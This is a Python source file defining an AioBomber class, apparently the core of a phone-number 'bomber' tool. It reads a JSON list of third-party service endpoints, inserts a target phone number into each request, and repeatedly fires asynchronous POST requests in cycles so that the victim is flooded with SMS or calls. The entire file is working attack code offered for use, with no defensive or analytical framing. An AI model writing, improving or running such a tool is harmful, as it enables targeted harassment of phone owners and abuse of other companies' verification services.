import asyncio
from . import sender, preparer
from loguru import logger
import aiohttp
from typing import Union
try:
    import ujson as json
except ImportError:
    import json


class AioBomber:
    def __init__(self, session: aiohttp.ClientSession = None, loop: asyncio.AbstractEventLoop = None) -> None:
        self._session = session or aiohttp.ClientSession(json_serialize=json.dumps)
        self._sender = sender.Sender(self._session)
        self._preparer = preparer.Preparer()
        if loop is None:
            try:
                loop = asyncio.get_running_loop()
            except RuntimeError:
                loop = asyncio.get_event_loop()
        self._loop = loop
        self._cache = {}

    async def attack(self,
                     number_of_cycles: int,
                     phone: str,
                     sleep_time: int = 0.5,
                     path_to_service: str = None) -> None:
        logger.info('Start attack')
        path_to_service = path_to_service or './services.json'
        if not len(self._cache):
            services = await self._sender.get_services(path_to_service)
        else:
            services = None
        for _ in range(number_of_cycles):
            self._attacker(services, phone)
            await asyncio.sleep(sleep_time)

    def _attacker(self, services: Union[None, dict], phone: str) -> None:
        if not len(self._cache):
            for key, value in services.items():
                args = self._preparer.generate_args(value, phone)
                args.update({'header': value.get('header')})
                self._cache[key] = args
                self._loop.create_task(self._sender.post(**args))
        else:
            for value in self._cache.values():
                self._loop.create_task(self._sender.post(**value))

    async def close_session(self) -> None:
        await self._session.close()
